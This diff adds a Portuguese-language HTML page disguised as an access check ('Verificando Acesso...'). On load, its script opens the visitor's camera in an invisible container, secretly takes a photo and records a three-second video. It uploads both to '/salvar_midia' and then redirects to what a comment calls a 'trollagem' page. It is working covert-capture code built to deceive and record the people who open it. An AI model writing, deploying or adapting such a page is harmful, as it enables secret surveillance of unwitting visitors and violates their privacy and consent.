@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando Acesso...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #00ff00;
+            font-family: monospace;
+        }
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="video-container">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        let videoStream;
+        
+        async function iniciarCamera() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true,
+                    audio: false
+                });
+                const video = document.getElementById('video');
+                video.srcObject = videoStream;
+                
+                // Espera o vídeo carregar
+                video.onloadedmetadata = () => {
+                    // Tira foto após 1 segundo
+                    setTimeout(tirarFoto, 1000);
+                    // Inicia gravação após 2 segundos
+                    setTimeout(gravarVideo, 2000);
+                };
+            } catch (error) {
+                console.error('Erro ao acessar câmera:', error);
+            }
+        }
+
+        async function tirarFoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            // Configura o canvas com o tamanho do vídeo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Desenha o frame do vídeo no canvas
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Converte para blob
+            canvas.toBlob(async (blob) => {
+                // Cria um FormData e adiciona a foto
+                const formData = new FormData();
+                formData.append('foto', blob, 'foto.jpg');
+                
+                // Envia para o servidor
+                try {
+                    const response = await fetch('/salvar_midia', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await response.json();
+                    console.log('Foto salva:', data);
+                } catch (error) {
+                    console.error('Erro ao salvar foto:', error);
+                }
+            }, 'image/jpeg');
+        }
+
+        let mediaRecorder;
+        let chunksVideo = [];
+
+        async function gravarVideo() {
+            if (videoStream) {
+                mediaRecorder = new MediaRecorder(videoStream);
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunksVideo.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunksVideo, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'video.webm');
+
+                    try {
+                        const response = await fetch('/salvar_midia', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        const data = await response.json();
+                        console.log('Vídeo salvo:', data);
+                        
+                        // Redireciona para a tela de "trollagem"
+                        window.location.href = '/telegram';
+                    } catch (error) {
+                        console.error('Erro ao salvar vídeo:', error);
+                    }
+                };
+
+                // Inicia gravação por 3 segundos
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    videoStream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            }
+        }
+
+        // Inicia o processo quando a página carrega
+        window.onload = iniciarCamera;
+    </script>
+</body>
+</html> 
